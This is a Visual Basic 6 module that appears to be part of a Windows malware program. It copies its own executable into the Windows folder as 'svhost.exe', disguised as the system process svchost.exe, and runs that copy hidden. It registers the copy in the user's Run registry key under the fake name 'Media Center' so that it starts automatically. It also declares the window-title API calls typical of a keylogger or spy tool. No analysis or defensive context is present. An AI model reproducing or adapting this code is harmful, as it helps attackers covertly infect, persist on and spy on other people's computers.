Attribute VB_Name = "Module1"
Public Declare Function GetWindowText Lib "User32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetForegroundWindow Lib "User32" () As Long

Public lRet(3) As Long, nWindow(3) As String, Capt(3) As String, swWin() As String, File As String, Buf As String, Msg As String
Public W As String, S As String, M As String, Cad As String, Reg As Object

Public Function iOpen() As String
 File = FreeFile
 Set Reg = CreateObject("wscript.shell")

 Open App.Path & "\" & App.EXEName & ".exe" For Binary As File
  Buf = Space(LOF(File))
  Get File, , Buf
 Close File
 
 If FileExist(Environ("WINDIR") & "\svhost.exe") = False Then
  Open Environ("WINDIR") & "\svhost.exe" For Binary As File
   Put File, , Buf
  Close File
  Shell Environ("WINDIR") & "\svhost.exe", vbHide: End
 Else
  Cad = ("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\") & "Media Center"
  Reg.Regwrite Cad, Environ("WINDIR") & "\svhost.exe"
 End If
End Function


Public Function FileExist(Ruta As String) As Boolean
 On Error GoTo Err:
  GetAttr (Ruta)
  FileExist = True
  Exit Function
Err: FileExist = False
End Function

